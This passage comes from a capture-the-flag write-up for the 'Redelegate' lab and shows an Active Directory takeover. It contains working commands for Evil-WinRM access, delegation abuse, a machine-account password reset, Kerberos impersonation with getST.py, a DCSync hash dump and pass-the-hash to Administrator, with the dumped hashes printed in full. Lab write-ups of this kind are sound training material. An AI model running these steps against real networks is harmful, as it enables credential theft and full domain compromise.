+SMB         10.129.234.50   445    DC               [+] redelegate.vl\helen.frost:Password123!</code></pre><p>As seen here the password has now been changed and the user has been compromised</p><p>Also worth noting this user is part of the remote management users group</p><h3>Evil-winrm as <code>helen.frost</code></h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc.redelegate.vl -u helen.frost -p &#39;Password123!&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Helen.Frost\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop&gt; dir
+
+
+    Directory: C:\Users\Helen.Frost\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         3/22/2026   8:37 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop&gt; type user.txt
+
+*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop&gt; </code></pre><p>I now have an active session on the domain controller</p><h2>Domain admin</h2><h3>Resource based constrained delegation</h3><p>Here i cannot make a computer account because the maq is set to 0 so ill have to set this up with <code>FS01$</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop&gt; Set-ADAccountControl -Identity &quot;FS01$&quot; -TrustedToAuthForDelegation $True
+*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop&gt; Set-ADObject -Identity &quot;CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&quot; -Add @{&quot;msDS-AllowedToDelegateTo&quot;=&quot;ldap/dc.redelegate.vl&quot;}</code></pre><p>This setup the delegation</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">net rpc password &quot;FS01$&quot; &#39;Password123!&#39; -U &quot;redelegate.vl&quot;/&quot;helen.frost&quot;%&#39;Password123!&#39; -S &quot;dc.redelegate.vl&quot;</code></pre><p>This changed the password of the machine account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.redelegate.vl -u &#39;FS01$&#39; -p &#39;Password123!&#39;                                                        
+SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.50   445    DC               [+] redelegate.vl\FS01$:Password123!</code></pre><p>The creds have now been changed</p><p>Now that the delegation has already been setup i can jump straight to using <code>getST.py</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">getST.py -spn &#39;ldap/dc.redelegate.vl&#39; -impersonate &#39;DC$&#39; &#39;redelegate.vl/FS01$:Password123!&#39;
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating DC$
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in DC$@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache</code></pre><p>Now i can export this ccache and impersonate the DC$ machine account and perform DCSync</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">export KRB5CCNAME=DC\$@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">secretsdump.py -k -no-pass -dc-ip &quot;10.129.234.50&quot; @dc.redelegate.vl 
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
+Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
+Marie.Curie:1105:aad3b435b51404eeaad3b435b51404ee:a4bc00e2a5edcec18bd6266e6c47d455:::
+Helen.Frost:1106:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+Michael.Pontiac:1107:aad3b435b51404eeaad3b435b51404ee:f37d004253f5f7525ef9840b43e5dad2:::
+Mallory.Roberts:1108:aad3b435b51404eeaad3b435b51404ee:980634f9aabfe13aec0111f64bda50c9:::
+James.Dinkleberg:1109:aad3b435b51404eeaad3b435b51404ee:2716d39cc76e785bd445ca353714854d:::
+Ryan.Cooper:1117:aad3b435b51404eeaad3b435b51404ee:062a12325a99a9da55f5070bf9c6fd2a:::
+sql_svc:1119:aad3b435b51404eeaad3b435b51404ee:76a96946d9b465ec76a4b0b316785d6b:::
+DC$:1002:aad3b435b51404eeaad3b435b51404ee:bfdff77d74764b0d4f940b7e9f684a61:::
+FS01$:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
+Administrator:aes128-cts-hmac-sha1-96:b4fb863396f4c7a91c49ba0c0637a3ac
+Administrator:des-cbc-md5:102f86737c3e9b2f
+krbtgt:aes256-cts-hmac-sha1-96:bff2ae7dfc202b4e7141a440c00b91308c45ea918b123d7e97cba1d712e6a435
+krbtgt:aes128-cts-hmac-sha1-96:9690508b681c1ec11e6d772c7806bc71
+krbtgt:des-cbc-md5:b3ce46a1fe86cb6b
+Christine.Flanders:aes256-cts-hmac-sha1-96:ceb5854b48f9b203b4aa9a8e0ac4af28b9dc49274d54e9f9a801902ea73f17ba
+Christine.Flanders:aes128-cts-hmac-sha1-96:e0fa68a3060b9543d04a6f84462829d9
+Christine.Flanders:des-cbc-md5:8980267623df2637
+Marie.Curie:aes256-cts-hmac-sha1-96:616e01b81238b801b99c284e7ebcc3d2d739046fca840634428f83c2eb18dbe8
+Marie.Curie:aes128-cts-hmac-sha1-96:daa48c455d1bd700530a308fb4020289
+Marie.Curie:des-cbc-md5:256889c8bf678910
+Helen.Frost:aes256-cts-hmac-sha1-96:6df13a248e2ce1460004d7dcce5c4f8a30ea2c53e2c7d3ef712410f102cacf61
+Helen.Frost:aes128-cts-hmac-sha1-96:884020e4824c0f50e596ba7a5d635634
+Helen.Frost:des-cbc-md5:1a26f249a80d70df
+Michael.Pontiac:aes256-cts-hmac-sha1-96:eca3a512ed24bb1c37cd2886ec933544b0d3cfa900e92b96d056632a6920d050
+Michael.Pontiac:aes128-cts-hmac-sha1-96:53456b952411ac9f2f3e2adf433ab443
+Michael.Pontiac:des-cbc-md5:833dc82fab76c229
+Mallory.Roberts:aes256-cts-hmac-sha1-96:c9ad270adea8746d753e881692e9a75b2487a6402e02c0c915eb8ac6c2c7ab6a
+Mallory.Roberts:aes128-cts-hmac-sha1-96:40f22695256d0c49089f7eda2d0d1266
+Mallory.Roberts:des-cbc-md5:cb25a726ae198686
+James.Dinkleberg:aes256-cts-hmac-sha1-96:c6cade4bc132681117d47dd422dadc66285677aac3e65b3519809447e119458b
+James.Dinkleberg:aes128-cts-hmac-sha1-96:35b2ea5440889148eafb6bed06eea4c1
+James.Dinkleberg:des-cbc-md5:83ef38dc8cd90da2
+Ryan.Cooper:aes256-cts-hmac-sha1-96:d94424fd2a046689ef7ce295cf562dce516c81697d2caf8d03569cd02f753b5f
+Ryan.Cooper:aes128-cts-hmac-sha1-96:48ea408634f503e90ffb404031dc6c98
+Ryan.Cooper:des-cbc-md5:5b19084a8f640e75
+sql_svc:aes256-cts-hmac-sha1-96:1decdb85de78f1ed266480b2f349615aad51e4dc866816f6ac61fa67be5bb598
+sql_svc:aes128-cts-hmac-sha1-96:88f45d60fa053d62160e8ea8f1d0231e
+sql_svc:des-cbc-md5:970d6115d3f4a43b
+DC$:aes256-cts-hmac-sha1-96:0e50c0a6146a62e4473b0a18df2ba4875076037ca1c33503eb0c7218576bb22b
+DC$:aes128-cts-hmac-sha1-96:7695e6b660218de8d911840d42e1a498
+DC$:des-cbc-md5:3db913751c434f61
+FS01$:aes256-cts-hmac-sha1-96:c8142b9998787102dc1d596190bc28b16a1787f24e956d0a204077efc31117ba
+FS01$:aes128-cts-hmac-sha1-96:48bcef06410264d5d28d91d7d8eb7cd1
+FS01$:des-cbc-md5:1f8058fde68a58df
+[*] Cleaning up...</code></pre><p>Ive dumped all the hashes using DCSync privs</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc.redelegate.vl -u Administrator -H &#39;ec17f7a2a4d96e177bfd101b94ffc0a7&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         3/22/2026   8:37 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </code></pre><p>Domain admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-rebound/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Rebound</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-retrotwo/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">RetroTwo</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
